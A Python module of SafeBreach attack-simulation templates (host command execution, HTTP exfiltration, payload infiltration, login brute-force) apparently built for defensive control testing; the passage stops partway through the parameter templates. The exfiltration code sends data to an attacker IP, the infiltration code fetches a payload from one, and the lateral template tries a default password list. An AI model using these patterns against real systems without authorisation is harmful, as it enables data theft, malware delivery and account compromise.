"""
Attack Code Templates for Studio MCP Server

Type-specific boilerplate templates for bootstrapping new custom attacks.
Each attack type has tailored templates demonstrating best practices and common patterns.

Copied from VS Extension reference implementation with string-key accessors
for MCP server integration.

Template Version: 1.0.0
"""

import copy
import json
from typing import Optional

# =============================================================================
# TEMPLATE VERSION
# =============================================================================
TEMPLATE_VERSION = "1.0.0"


# =============================================================================
# HOST ATTACK TEMPLATE (target.py only)
# =============================================================================
HOST_TEMPLATE = '''"""
SafeBreach Custom Attack - Host Level
=====================================

Attack Type: Host (Local Execution)
Template Version: 1.0.0

OVERVIEW
--------
Host-level attacks execute entirely on a single machine without network communication
to an attacker simulator. They test endpoint security controls like:
- Process execution monitoring
- Command-line logging
- File system protection
- Registry monitoring (Windows)

HOW THIS ATTACK WORKS
---------------------
1. Reads the command to execute from the 'target_command' parameter
2. Executes the command using the SafeBreach framework
3. Validates the output against the 'expected_output' pattern
4. Success = command ran and output matched (attack NOT blocked)
5. Failure = command blocked or output didn't match (attack BLOCKED)

SAFEBREACH CONCEPTS
-------------------
- system_data: Dictionary containing your attack parameters defined in parameters.json
- state: SafeBreachData object that tracks execution context across framework calls
- simulation_steps: Logger for messages visible in SafeBreach simulation logs
- Exceptions determine simulation result:
  * No exception = "Missed" (attack succeeded, not blocked)
  * SBError = "Blocked" (attack was prevented)
  * NotApplicable = "Not Applicable" (preconditions not met)
  * WrongUsage = "Error" (configuration/parameter issue)

PARAMETERS (defined in parameters.json)
---------------------------------------
- target_command: The command to execute (e.g., "whoami", "hostname")
- expected_output: Pattern to find in command output for validation

CUSTOMIZATION IDEAS
-------------------
- Change target_command to test different commands (ipconfig, netstat, etc.)
- Add file operations using framework.endpoint.common.file
- Add registry operations using framework.endpoint.windows.safe_actions
- Chain multiple commands for complex attack scenarios
"""

import logging
import re

from framework import SafeBreachData
from framework.exceptions.general import SBError, WrongUsage
from framework.endpoint.utils.run_cmd import run_until_timeout, OUTPUT_KEY, ERROR_KEY, RETURN_CODE_KEY
from framework_utils.exceptions import NotApplicable

# =============================================================================
# SIMULATION LOGGER
# =============================================================================
# This special logger sends messages to SafeBreach's "Simulation Logs" tab.
# Always use this logger (not print()) so logs are visible in the SafeBreach console.
simulation_steps = logging.getLogger("simulation")


def main(system_data, asset, proxy, *args, **kwargs):
    """
    Main entry point for the host-level attack.

    SafeBreach calls this function to execute the attack simulation.
    The function signature is fixed and must not be changed.

    Parameters
    ----------
    system_data : dict
        Contains your custom parameters from parameters.json.
        Access parameters via system_data["parameter_name"].

    asset : bytes or None
        Binary asset data (not used in host attacks, used in exfil/infil).

    proxy : dict or None
        Proxy configuration if the simulation runs through a proxy.
        Contains: host, protocol, port, username, password

    *args, **kwargs :
        Additional arguments. Extract 'state' from kwargs for framework calls.

    Returns
    -------
    The return value is used for result comparison but doesn't affect
    the simulation outcome. Outcome is determined by exceptions.
    """

    # =========================================================================
    # STEP 1: Initialize State
    # =========================================================================
    # The state object tracks execution context and stores results from
    # framework function calls. Always initialize it at the start.
    state = kwargs.get("state") or SafeBreachData({})

    # =========================================================================
    # STEP 2: Extract Parameters
    # =========================================================================
    # Parameters come from system_data, which is populated from parameters.json.
    # Always use try/except to handle missing required parameters gracefully.
    try:
        target_command = system_data["target_command"]
        expected_output = system_data.get("expected_output", "")  # Optional with default
    except KeyError as e:
        # WrongUsage indicates a configuration problem (missing parameter)
        simulation_steps.error("Missing required parameter", extra={"parameter": str(e)})
        raise WrongUsage(f"Missing required parameter: {e}")

    simulation_steps.info("Attack starting", extra={
        "command": target_command,
        "expected_output": expected_output
    })

    # =========================================================================
    # STEP 3: Execute the Attack
    # =========================================================================
    # run_until_timeout executes a command and waits for completion.
    # Results are stored in the state object under specific keys.
    try:
        # Parse command - if it's a simple command, wrap in list
        if isinstance(target_command, str):
            cmd_list = target_command.split()
        else:
            cmd_list = target_command

        simulation_steps.info("Executing command", extra={"cmd": cmd_list})

        # Execute the command - results go into state
        run_until_timeout(state, cmd_list)

        # Extract results from state
        output = state.get(OUTPUT_KEY, "")
        error = state.get(ERROR_KEY, "")
        return_code = state.get(RETURN_CODE_KEY, [-1])[0]

        simulation_steps.info("Command completed", extra={
            "return_code": return_code,
            "output_length": len(output),
            "error_length": len(error)
        })

    except Exception as e:
        # If command execution fails entirely, the attack was blocked
        simulation_steps.error("Command execution failed", extra={"error": str(e)})
        raise SBError(f"Command execution blocked: {e}")

    # =========================================================================
    # STEP 4: Validate Results
    # =========================================================================
    # Check if the command succeeded and output matches expectations.
    # This determines whether the attack was "blocked" or "missed".

    if return_code != 0:
        simulation_steps.info("Command returned non-zero exit code", extra={
            "return_code": return_code,
            "error": error
        })
        raise SBError(f"Command failed with exit code {return_code}: {error}")

    # If expected_output is specified, validate it appears in the output
    if expected_output:
        if not re.search(expected_output, output, re.IGNORECASE):
            simulation_steps.info("Expected output not found", extra={
                "expected": expected_output,
                "actual_output": output[:200]  # First 200 chars
            })
            raise SBError(f"Expected output '{expected_output}' not found in command output")

        simulation_steps.info("Output validation passed", extra={
            "pattern": expected_output
        })

    # =========================================================================
    # STEP 5: Attack Completed Successfully
    # =========================================================================
    # If we reach here without raising an exception, the attack succeeded.
    # In SafeBreach terms, this means the attack was NOT blocked (Missed).
    simulation_steps.info("Attack completed successfully - command executed and validated", extra={
        "output_preview": output[:100] if output else "(empty)"
    })

    # =========================================================================
    # STEP 6: Cleanup
    # =========================================================================
    # Revert changes and remove artifacts after the simulation completes.
    # Host attacks often create files, modify registry keys, spawn processes,
    # or change system settings that should be undone.
    #
    # If you ONLY used framework components (e.g., run_until_timeout),
    # cleanup is handled automatically - no action needed.
    #
    # If you used custom Python code (e.g., open(), subprocess, os.mkdir),
    # you MUST add cleanup code here to undo those changes. For example:
    #   os.remove("/tmp/attack_artifact.txt")
    #   subprocess.run(["reg", "delete", ...])

    return output
'''


# =============================================================================
# EXFILTRATION TEMPLATES
# =============================================================================
EXFILTRATION_TARGET_TEMPLATE = '''"""
SafeBreach Custom Attack - Exfiltration (Target Side)
=====================================================

Attack Type: Exfiltration
Role: TARGET (sends data OUT to attacker)
Template Version: 1.1.0

OVERVIEW
--------
Exfiltration attacks test Data Loss Prevention (DLP) and network security controls
by simulating sensitive data being stolen from a compromised endpoint.

DATA FLOW: TARGET --> ATTACKER
The target (victim machine) sends sensitive data to the attacker (exfil server).

HOW THIS ATTACK WORKS
---------------------
1. Target sends "sensitive data" to attacker via http_post (handles sync automatically)
2. Attacker receives and logs the exfiltrated data
3. Both sides return data for validation comparison

SAFEBREACH CONCEPTS
-------------------
- framework.red.http.http_post(): BreachPointComponent that handles WAIT internally
- state["DATA"]: Stores the response from HTTP operations
- NO manual WAIT() needed - http_post() synchronizes with attacker automatically

WHY TWO FILES?
--------------
Network attacks (Exfil, Infil, Lateral) require code on BOTH machines:
- target.py: Runs on the "victim" simulator
- attacker.py: Runs on the "attacker" simulator
The SafeBreach platform coordinates execution between them.

PARAMETERS (defined in parameters.json)
---------------------------------------
- sensitive_data: The data to "leak" (simulates stolen credentials, PII, etc.)
- exfil_port: Port number for the HTTP connection

CUSTOMIZATION IDEAS
-------------------
- Change to HTTPS for encrypted exfiltration testing
- Add data encoding (base64, hex) to test DLP evasion
- Use different protocols (DNS, ICMP) via socket operations
- Chunk the data to test streaming exfiltration detection
"""

import hashlib
import logging
import framework
from framework import SafeBreachData
from framework.exceptions.general import SBError, WrongUsage
from framework.red.http import request
from framework.proxies import add_proxy

# =============================================================================
# SIMULATION LOGGER
# =============================================================================
simulation_steps = logging.getLogger("simulation")


def hash_data(data):
    """Hash data using SHA256 for comparison."""
    if isinstance(data, str):
        data = data.encode()
    return hashlib.sha256(data).hexdigest()


def main(system_data, asset, proxy, *args, **kwargs):
    """
    Target-side entry point for exfiltration attack.

    This code runs on the TARGET (victim) simulator.
    It sends sensitive data to the ATTACKER simulator.

    Parameters
    ----------
    system_data : dict
        Contains custom parameters AND network IPs:
        - system_data["attacker_external_ip"]: IP to reach the attacker
        - system_data["sensitive_data"]: Data to exfiltrate
        - system_data["exfil_port"]: Port for HTTP connection

    asset : bytes or None
        In exfiltration, 'asset' can contain binary data to exfiltrate.
        This template uses the parameter instead for clarity.

    proxy : dict or None
        Proxy configuration for HTTP requests.
    """

    # =========================================================================
    # STEP 1: Initialize State
    # =========================================================================
    state = kwargs.get("state") or SafeBreachData({})

    # =========================================================================
    # STEP 2: Extract Parameters
    # =========================================================================
    try:
        # Network IPs are automatically provided by SafeBreach
        attacker_ip = system_data["attacker_external_ip"]

        # Custom parameters from parameters.json
        sensitive_data = system_data["sensitive_data"]
        exfil_port = int(system_data.get("exfil_port", 8080))
    except KeyError as e:
        simulation_steps.error("Missing required parameter", extra={"parameter": str(e)})
        raise WrongUsage(f"Missing required parameter: {e}")

    # Prepare the data to exfiltrate
    exfil_data = sensitive_data.encode() if isinstance(sensitive_data, str) else sensitive_data
    data_hash = hash_data(exfil_data)

    simulation_steps.info("Exfiltration attack starting", extra={
        "attacker_ip": attacker_ip,
        "port": exfil_port,
        "data_size": len(exfil_data),
        "data_hash": data_hash
    })

    # =========================================================================
    # STEP 3: Configure Proxy (if provided)
    # =========================================================================
    if proxy:
        state = add_proxy(state, proxy)
        simulation_steps.info("Proxy configured", extra={"proxy_host": proxy.get("host")})

    # =========================================================================
    # STEP 4: Exfiltrate Data via HTTP POST
    # =========================================================================
    # Using the low-level request() function which passes data directly
    # wait=True handles synchronization with attacker's http_simple_server
    exfil_url = f"http://{attacker_ip}:{exfil_port}"

    try:
        simulation_steps.info("Sending sensitive data to attacker", extra={
            "url": exfil_url,
            "data_preview": sensitive_data[:50] + "..." if len(sensitive_data) > 50 else sensitive_data
        })

        # Use request() with wait=True - this handles WAIT synchronization
        # and passes data directly to requests.request()
        request(
            state=state,
            method="POST",
            url=exfil_url,
            wait=True,
            data=exfil_data,
            headers={"Content-Type": "application/octet-stream"}
        )

        simulation_steps.info("Data sent successfully", extra={"hash": data_hash})

    except Exception as e:
        simulation_steps.error("Exfiltration failed", extra={"error": str(e)})
        raise SBError(f"Exfiltration blocked: {e}")

    # =========================================================================
    # STEP 5: Return Hash for Comparison
    # =========================================================================
    # Both target and attacker return the same hash for SafeBreach to compare
    simulation_steps.info("Exfiltration completed successfully")

    # =========================================================================
    # STEP 6: Cleanup
    # =========================================================================
    # Revert changes and remove artifacts after the simulation completes.
    # Exfiltration targets may stage data in temporary files or create
    # network artifacts that should be cleaned up.
    #
    # If you ONLY used framework components (e.g., request(), http_post()),
    # cleanup is handled automatically - no action needed.
    #
    # If you used custom Python code (e.g., writing staged data to disk,
    # collecting files into an archive), you MUST add cleanup code here.
    # For example:
    #   os.remove("/tmp/staged_exfil_data.zip")
    #   shutil.rmtree("/tmp/collected_files/")

    return data_hash
'''


EXFILTRATION_ATTACKER_TEMPLATE = '''"""
SafeBreach Custom Attack - Exfiltration (Attacker Side)
=======================================================

Attack Type: Exfiltration
Role: ATTACKER (receives data FROM target)
Template Version: 1.1.0

OVERVIEW
--------
This is the attacker-side code for an exfiltration attack.
It runs an HTTP server that receives "stolen" data from the target.

DATA FLOW: TARGET --> ATTACKER
The attacker acts as the exfiltration endpoint (C2 server).

HOW THIS ATTACK WORKS
---------------------
1. Attacker starts HTTP server using framework.green.http
2. Framework automatically signals readiness to target
3. Target sends data via HTTP POST
4. Framework receives and stores the data in state["BODY"]
5. Attacker returns received data for validation

SAFEBREACH CONCEPTS
-------------------
- framework.green.http.http_simple_server(): Framework's native HTTP server
  that handles READY/WAIT synchronization automatically
- state["BODY"]: Contains the POST body data after server receives request

PARAMETERS (defined in parameters.json)
---------------------------------------
- exfil_port: Port number to listen on (must match target's port)

Note: sensitive_data parameter is only used by target side.
"""

import hashlib
import logging
import framework
from framework import SafeBreachData
from framework.green.http import http_simple_server
from framework.exceptions.general import WrongUsage

# =============================================================================
# SIMULATION LOGGER
# =============================================================================
simulation_steps = logging.getLogger("simulation")


def hash_data(data):
    """Hash data using SHA256 for comparison."""
    if isinstance(data, str):
        data = data.encode()
    return hashlib.sha256(data).hexdigest()


def main(system_data, asset, proxy, *args, **kwargs):
    """
    Attacker-side entry point for exfiltration attack.

    This code runs on the ATTACKER simulator.
    It receives sensitive data sent by the TARGET simulator using the
    framework's native HTTP server component.

    Parameters
    ----------
    system_data : dict
        Contains network IPs and custom parameters:
        - system_data["exfil_port"]: Port to listen on
    """

    # =========================================================================
    # STEP 1: Initialize State
    # =========================================================================
    state = kwargs.get("state") or SafeBreachData({})

    # =========================================================================
    # STEP 2: Extract Parameters
    # =========================================================================
    try:
        exfil_port = int(system_data.get("exfil_port", 8080))
    except (KeyError, ValueError) as e:
        simulation_steps.error("Parameter error", extra={"error": str(e)})
        raise WrongUsage(f"Parameter error: {e}")

    simulation_steps.info("Starting exfiltration receiver", extra={
        "port": exfil_port
    })

    # =========================================================================
    # STEP 3: Start HTTP Server (Framework Native)
    # =========================================================================
    # The framework's http_simple_server handles:
    # - Starting the HTTP server on the specified port
    # - Signaling READY to the target automatically
    # - Receiving POST data into state["BODY"]
    # - Waiting for the target's request
    # - Proper synchronization and cleanup
    http_simple_server(
        state,
        port=exfil_port,
        requests_num=1  # Handle one request then terminate
    )

    # =========================================================================
    # STEP 4: Extract Received Data and Compute Hash
    # =========================================================================
    # The framework stores POST body in state["BODY"]
    received_data = state.get("BODY", b"")
    data_hash = hash_data(received_data)

    simulation_steps.info("Exfiltration receiver completed", extra={
        "total_received": len(received_data) if received_data else 0,
        "hash": data_hash
    })

    # =========================================================================
    # STEP 5: Cleanup
    # =========================================================================
    # Revert changes and remove artifacts after the simulation completes.
    # Exfiltration attackers may store received data in temporary files
    # that should be cleaned up.
    #
    # If you ONLY used framework components (e.g., http_simple_server()),
    # cleanup is handled automatically - no action needed.
    #
    # If you used custom Python code (e.g., saving received data to disk),
    # you MUST add cleanup code here. For example:
    #   os.remove("/tmp/received_exfil.bin")

    # Return hash for comparison with target's hash
    # Both sides return the same hash if data was transmitted correctly
    return data_hash
'''


# =============================================================================
# INFILTRATION TEMPLATES
# =============================================================================
INFILTRATION_TARGET_TEMPLATE = '''"""
SafeBreach Custom Attack - Infiltration (Target Side)
=====================================================

Attack Type: Infiltration
Role: TARGET (receives payload FROM attacker)
Template Version: 1.1.0

OVERVIEW
--------
Infiltration attacks test network security controls against incoming malicious
payloads. They simulate scenarios like:
- Malware downloads from C2 servers
- Drive-by downloads
- Payload staging for multi-stage attacks

DATA FLOW: ATTACKER --> TARGET
The target (victim machine) downloads a payload from the attacker.

HOW THIS ATTACK WORKS
---------------------
1. Attacker starts HTTP server with malicious payload (http_simple_server)
2. Target downloads payload via http_get (handles sync automatically)
3. Target "executes" the payload (simulated)
4. Both sides return data for validation

SAFEBREACH CONCEPTS
-------------------
- framework.red.http.http_get(): BreachPointComponent that handles WAIT internally
- state["DATA"]: Contains the downloaded payload after http_get()
- NO manual WAIT() needed - http_get() synchronizes with attacker automatically

PARAMETERS (defined in parameters.json)
---------------------------------------
- infil_port: Port number for HTTP connection
- malicious_script: (Used by attacker) The payload to serve

CUSTOMIZATION IDEAS
-------------------
- Add file writing to test endpoint protection against drops
- Execute the payload using framework.endpoint.utils.run_cmd
- Test different download methods (PowerShell, curl, wget)
- Add obfuscation to test deobfuscation detection
"""

import logging
import framework
from framework import SafeBreachData
from framework.exceptions.general import SBError, WrongUsage
from framework.red.http import http_get
from framework.proxies import add_proxy, get_http_proxy_information

# =============================================================================
# SIMULATION LOGGER
# =============================================================================
simulation_steps = logging.getLogger("simulation")


def main(system_data, asset, proxy, *args, **kwargs):
    """
    Target-side entry point for infiltration attack.

    This code runs on the TARGET (victim) simulator.
    It downloads a malicious payload from the ATTACKER simulator.

    Parameters
    ----------
    system_data : dict
        Contains network IPs and custom parameters:
        - system_data["attacker_external_ip"]: IP to download from
        - system_data["infil_port"]: Port for HTTP connection
    """

    # =========================================================================
    # STEP 1: Initialize State
    # =========================================================================
    state = kwargs.get("state") or SafeBreachData({})

    # =========================================================================
    # STEP 2: Extract Parameters
    # =========================================================================
    try:
        # Network IP is automatically provided by SafeBreach
        attacker_ip = system_data["attacker_external_ip"]

        # Custom parameter from parameters.json
        infil_port = int(system_data.get("infil_port", 8080))
    except KeyError as e:
        simulation_steps.error("Missing required parameter", extra={"parameter": str(e)})
        raise WrongUsage(f"Missing required parameter: {e}")

    simulation_steps.info("Infiltration attack starting", extra={
        "attacker_ip": attacker_ip,
        "port": infil_port
    })

    # =========================================================================
    # STEP 3: Configure Proxy (if provided)
    # =========================================================================
    if proxy:
        state = add_proxy(state, proxy)
        simulation_steps.info("Proxy configured", extra={"proxy_host": proxy.get("host")})

    # =========================================================================
    # STEP 4: Download Malicious Payload
    # =========================================================================
    # NOTE: http_get is a BreachPointComponent - it handles WAIT() internally
    # to synchronize with the attacker's http_simple_server. No manual WAIT needed!
    download_url = f"http://{attacker_ip}:{infil_port}/payload"

    try:
        simulation_steps.info("Downloading payload from attacker", extra={"url": download_url})

        # http_get handles sync with attacker and stores content in state["DATA"]
        http_get(state, url=download_url)

        # Extract the downloaded payload (may be str or bytes depending on content)
        payload = state.get("DATA", b"")

        # Convert to string for logging preview
        if isinstance(payload, bytes):
            preview = payload[:50].decode("utf-8", errors="replace")
        else:
            preview = str(payload)[:50]

        simulation_steps.info("Payload downloaded", extra={
            "size": len(payload),
            "preview": preview + "..." if len(payload) > 50 else preview
        })

    except Exception as e:
        # If download fails, infiltration was blocked (firewall, IPS, etc.)
        simulation_steps.error("Download failed", extra={"error": str(e)})
        raise SBError(f"Infiltration blocked: {e}")

    # =========================================================================
    # STEP 5: Simulate Payload Execution
    # =========================================================================
    # In a real attack, you might write the file and execute it.
    # For this template, we just log that we "received" the malicious code.
    simulation_steps.info("Simulating payload execution", extra={
        "payload_type": "script",
        "action": "logged (not actually executed)"
    })

    # =========================================================================
    # STEP 6: Attack Completed
    # =========================================================================
    simulation_steps.info("Infiltration completed successfully - payload downloaded")

    # =========================================================================
    # STEP 7: Cleanup
    # =========================================================================
    # Revert changes and remove artifacts after the simulation completes.
    # Infiltration targets may have downloaded payloads, dropped files to disk,
    # or executed artifacts that should be removed.
    #
    # If you ONLY used framework components (e.g., http_get()),
    # cleanup is handled automatically - no action needed.
    #
    # If you used custom Python code (e.g., writing the payload to disk,
    # executing downloaded scripts), you MUST add cleanup code here.
    # For example:
    #   os.remove("/tmp/downloaded_payload.exe")
    #   shutil.rmtree("/tmp/malware_staging/")

    return payload
'''


INFILTRATION_ATTACKER_TEMPLATE = '''"""
SafeBreach Custom Attack - Infiltration (Attacker Side)
=======================================================

Attack Type: Infiltration
Role: ATTACKER (sends payload TO target)
Template Version: 1.1.0

OVERVIEW
--------
This is the attacker-side code for an infiltration attack.
It runs an HTTP server that serves a "malicious payload" to the target.

DATA FLOW: ATTACKER --> TARGET
The attacker acts as a malware delivery server (C2, watering hole, etc.).

HOW THIS ATTACK WORKS
---------------------
1. Attacker starts HTTP server with payload using framework.green.http
2. Framework automatically signals readiness to target
3. Target downloads payload via HTTP GET
4. Framework handles synchronization and logging

SAFEBREACH CONCEPTS
-------------------
- framework.green.http.http_simple_server(): Framework's native HTTP server
  that handles READY/WAIT synchronization automatically
- state["DATA"]: Contains the payload to serve (set before calling server)
- malicious_script parameter: The payload content to deliver

PARAMETERS (defined in parameters.json)
---------------------------------------
- malicious_script: The payload/script to serve to the target
- infil_port: Port number to serve on (must match target's port)
"""

import logging
import framework
from framework import SafeBreachData
from framework.green.http import http_simple_server
from framework.exceptions.general import WrongUsage

# =============================================================================
# SIMULATION LOGGER
# =============================================================================
simulation_steps = logging.getLogger("simulation")


def main(system_data, asset, proxy, *args, **kwargs):
    """
    Attacker-side entry point for infiltration attack.

    This code runs on the ATTACKER simulator.
    It serves a malicious payload to the TARGET simulator using the
    framework's native HTTP server component.

    Parameters
    ----------
    system_data : dict
        Contains network IPs and custom parameters:
        - system_data["malicious_script"]: The payload to serve
        - system_data["infil_port"]: Port to serve on
    """

    # =========================================================================
    # STEP 1: Initialize State
    # =========================================================================
    state = kwargs.get("state") or SafeBreachData({})

    # =========================================================================
    # STEP 2: Extract Parameters
    # =========================================================================
    try:
        infil_port = int(system_data.get("infil_port", 8080))

        # Get the malicious payload to serve
        malicious_script = system_data.get("malicious_script", "# Malicious script placeholder")

        # Convert to string if bytes (http_simple_server expects string content)
        if isinstance(malicious_script, bytes):
            payload = malicious_script.decode("utf-8", errors="replace")
        else:
            payload = malicious_script

    except (KeyError, ValueError) as e:
        simulation_steps.error("Parameter error", extra={"error": str(e)})
        raise WrongUsage(f"Parameter error: {e}")

    simulation_steps.info("Starting infiltration server", extra={
        "port": infil_port,
        "payload_size": len(payload)
    })

    # =========================================================================
    # STEP 3: Start HTTP Server (Framework Native)
    # =========================================================================
    # The framework's http_simple_server handles:
    # - Starting the HTTP server on the specified port
    # - Signaling READY to the target automatically
    # - Serving the payload content
    # - Waiting for the target's request
    # - Proper synchronization and cleanup
    http_simple_server(
        state,
        port=infil_port,
        content=payload,
        requests_num=1  # Handle one request then terminate
    )

    # =========================================================================
    # STEP 4: Attack Completed
    # =========================================================================
    simulation_steps.info("Infiltration server completed", extra={
        "payload_served": len(payload)
    })

    # =========================================================================
    # STEP 5: Cleanup
    # =========================================================================
    # Revert changes and remove artifacts after the simulation completes.
    # Infiltration attackers may have staged payload files or created
    # temporary content that should be cleaned up.
    #
    # If you ONLY used framework components (e.g., http_simple_server()),
    # cleanup is handled automatically - no action needed.
    #
    # If you used custom Python code (e.g., generating payloads on disk,
    # compiling binaries), you MUST add cleanup code here. For example:
    #   os.remove("/tmp/generated_payload.bin")

    return payload
'''


# =============================================================================
# LATERAL MOVEMENT TEMPLATES
# =============================================================================
LATERAL_MOVEMENT_TARGET_TEMPLATE = '''"""
SafeBreach Custom Attack - Lateral Movement (Target Side)
=========================================================

Attack Type: Lateral Movement
Role: TARGET (runs vulnerable service)
Template Version: 1.1.0

OVERVIEW
--------
Lateral movement attacks test network segmentation and internal security controls.
They simulate an attacker pivoting through a network after initial compromise.

UNIQUE PATTERN: TARGET IS THE SERVER
Unlike exfiltration/infiltration where attacker is server, in lateral movement
the TARGET hosts a vulnerable service that the ATTACKER exploits.

HOW THIS ATTACK WORKS
---------------------
1. Target starts a vulnerable "authentication service" using framework.green.http
2. Framework automatically signals readiness to attacker
3. Attacker sends authentication attempts (brute force)
4. Framework handles all requests and collects POST bodies

SAFEBREACH CONCEPTS
-------------------
- TARGET is the server (different from exfil/infil!)
- framework.green.http.http_simple_server(): Native HTTP server with auto READY
- join_data=True: Joins all POST bodies together for analysis
- This models internal service attacks, not external data theft

USE CASE EXAMPLES
-----------------
- RDP brute force
- SSH password spraying
- SMB authentication attacks
- Internal web application attacks
- Database authentication attempts

PARAMETERS (defined in parameters.json)
---------------------------------------
- service_port: Port for the vulnerable service
- num_attempts: Expected number of brute force attempts (default: 3)
- username, password_attempts: (Used by attacker)
"""

import logging
import framework
from framework import SafeBreachData
from framework.green.http import http_simple_server
from framework.exceptions.general import WrongUsage

# =============================================================================
# SIMULATION LOGGER
# =============================================================================
simulation_steps = logging.getLogger("simulation")


def main(system_data, asset, proxy, *args, **kwargs):
    """
    Target-side entry point for lateral movement attack.

    This code runs on the TARGET simulator.
    It hosts a vulnerable service that the ATTACKER will attack using the
    framework's native HTTP server component.

    NOTE: In lateral movement, the TARGET is the SERVER.

    Parameters
    ----------
    system_data : dict
        Contains network IPs and custom parameters:
        - system_data["service_port"]: Port for the service
        - system_data["num_attempts"]: Expected number of auth attempts
    """

    # =========================================================================
    # STEP 1: Initialize State
    # =========================================================================
    state = kwargs.get("state") or SafeBreachData({})

    # =========================================================================
    # STEP 2: Extract Parameters
    # =========================================================================
    try:
        service_port = int(system_data.get("service_port", 8080))
        # Number of authentication attempts to expect
        num_attempts = int(system_data.get("num_attempts", 3))
    except (KeyError, ValueError) as e:
        simulation_steps.error("Parameter error", extra={"error": str(e)})
        raise WrongUsage(f"Parameter error: {e}")

    simulation_steps.info("Starting vulnerable authentication service", extra={
        "port": service_port,
        "expected_attempts": num_attempts
    })

    # =========================================================================
    # STEP 3: Start Vulnerable Service (Framework Native)
    # =========================================================================
    # The framework's http_simple_server handles:
    # - Starting the HTTP server on the specified port
    # - Signaling READY to the attacker automatically
    # - Receiving POST requests and storing bodies
    # - Proper synchronization and cleanup
    http_simple_server(
        state,
        port=service_port,
        response_code=401,           # Return 401 Unauthorized
        requests_num=num_attempts,   # Handle expected number of attempts
        join_data=True               # Join all POST bodies together
    )

    # =========================================================================
    # STEP 4: Analyze Received Data
    # =========================================================================
    # With join_data=True, all POST bodies are joined in state["BODY"]
    received_data = state.get("BODY", b"")
    data_str = received_data.decode("utf-8", errors="replace") if received_data else ""

    simulation_steps.info("Lateral movement attack completed", extra={
        "total_data_received": len(received_data) if received_data else 0,
        "data_preview": data_str[:200] if data_str else "(empty)"
    })

    # =========================================================================
    # STEP 5: Cleanup
    # =========================================================================
    # Revert changes and remove artifacts after the simulation completes.
    # Lateral movement targets may have created service artifacts, log entries,
    # or authentication state that should be cleaned up.
    #
    # If you ONLY used framework components (e.g., http_simple_server()),
    # cleanup is handled automatically - no action needed.
    #
    # If you used custom Python code (e.g., opening sockets, writing logs,
    # creating user accounts), you MUST add cleanup code here. For example:
    #   os.remove("/tmp/service_log.txt")
    #   server_socket.close()

    # Return the received data for validation
    return received_data
'''


LATERAL_MOVEMENT_ATTACKER_TEMPLATE = '''"""
SafeBreach Custom Attack - Lateral Movement (Attacker Side)
===========================================================

Attack Type: Lateral Movement
Role: ATTACKER (attacks target's service)
Template Version: 1.0.0

OVERVIEW
--------
This is the attacker-side code for a lateral movement attack.
It simulates attacking an internal service on the target machine.

UNIQUE PATTERN: ATTACKER IS THE CLIENT
In lateral movement, the attacker sends requests TO the target's service.
This models internal network attacks like:
- Brute forcing RDP/SSH/SMB
- Attacking internal web applications
- Exploiting database services

HOW THIS ATTACK WORKS
---------------------
1. Attacker waits for target's service to start
2. Attacker sends authentication attempts (brute force)
3. Attacker signals completion (framework.READY)
4. Both sides compare attempt counts

SAFEBREACH CONCEPTS
-------------------
- framework.WAIT(): Wait for target's service to be ready
- framework.READY(): Signal attack is complete
- framework.red.http.http_post(): Send attack payloads

PARAMETERS (defined in parameters.json)
---------------------------------------
- service_port: Port of the target's vulnerable service
- username: Username to brute force
- password_attempts: Comma-separated list of passwords to try
"""

import logging
import framework
from framework import SafeBreachData
from framework.exceptions.general import WrongUsage
from framework.red.http import http_post

# =============================================================================
# SIMULATION LOGGER
# =============================================================================
simulation_steps = logging.getLogger("simulation")


def main(system_data, asset, proxy, *args, **kwargs):
    """
    Attacker-side entry point for lateral movement attack.

    This code runs on the ATTACKER simulator.
    It attacks a service running on the TARGET simulator.

    NOTE: In lateral movement, the ATTACKER is the CLIENT.

    Parameters
    ----------
    system_data : dict
        Contains network IPs and custom parameters:
        - system_data["target_external_ip"]: IP of target's service
        - system_data["service_port"]: Port of the vulnerable service
        - system_data["username"]: Username for brute force
        - system_data["password_attempts"]: Passwords to try
    """

    # =========================================================================
    # STEP 1: Initialize
    # =========================================================================
    state = kwargs.get("state") or SafeBreachData({})

    # =========================================================================
    # STEP 2: Extract Parameters
    # =========================================================================
    try:
        # Target's IP (we're connecting TO the target)
        target_ip = system_data["target_external_ip"]
        service_port = int(system_data.get("service_port", 8080))

        # Brute force parameters
        username = system_data.get("username", "admin")
        password_attempts = system_data.get("password_attempts", "password,admin,123456")

        # Parse password list
        if isinstance(password_attempts, str):
            passwords = [p.strip() for p in password_attempts.split(",")]
        else:
            passwords = password_attempts

    except KeyError as e:
        simulation_steps.error("Missing required parameter", extra={"parameter": str(e)})
        raise WrongUsage(f"Missing required parameter: {e}")

    simulation_steps.info("Starting lateral movement attack", extra={
        "target_ip": target_ip,
        "port": service_port,
        "username": username,
        "password_count": len(passwords)
    })

    # =========================================================================
    # STEP 3: Wait for Target's Service
    # =========================================================================
    simulation_steps.info("Waiting for target service to be ready...")
    framework.WAIT()
    simulation_steps.info("Target service is ready, starting brute force")

    # =========================================================================
    # STEP 4: Brute Force Attack
    # =========================================================================
    auth_url = f"http://{target_ip}:{service_port}/login"
    attempts_sent = 0

    for password in passwords:
        try:
            # Create auth payload
            auth_data = f"username={username}&password={password}"

            simulation_steps.info("Attempting authentication", extra={
                "attempt": attempts_sent + 1,
                "username": username,
                "password": password[:3] + "***"  # Mask password in logs
            })

            # Send authentication attempt
            # Store data in state["BODY"] - http_post reads from there for POST body
            state["BODY"] = auth_data.encode()
            http_post(state, auth_url, headers={"Content-Type": "application/x-www-form-urlencoded"})

            attempts_sent += 1

        except Exception as e:
            # Log but continue - some attempts may be blocked
            simulation_steps.info("Attempt blocked or failed", extra={
                "error": str(e),
                "attempt": attempts_sent + 1
            })
            attempts_sent += 1

    simulation_steps.info("Brute force completed", extra={
        "total_attempts": attempts_sent
    })

    # =========================================================================
    # STEP 5: Signal Completion
    # =========================================================================
    framework.READY()

    # =========================================================================
    # STEP 6: Return Results
    # =========================================================================
    simulation_steps.info("Lateral movement attack completed")

    # =========================================================================
    # STEP 7: Cleanup
    # =========================================================================
    # Revert changes and remove artifacts after the simulation completes.
    # Lateral movement attackers may have created connection state, credential
    # caches, or temporary attack data that should be cleaned up.
    #
    # If you ONLY used framework components (e.g., http_post(), WAIT/READY),
    # cleanup is handled automatically - no action needed.
    #
    # If you used custom Python code (e.g., caching credentials, writing
    # exploit payloads to disk), you MUST add cleanup code here. For example:
    #   os.remove("/tmp/credential_list.txt")
    #   os.remove("/tmp/exploit_payload.bin")

    return attempts_sent
'''


# =============================================================================
# PARAMETERS.JSON TEMPLATES
# =============================================================================
HOST_PARAMETERS_TEMPLATE = {
    "parameters": [
        {
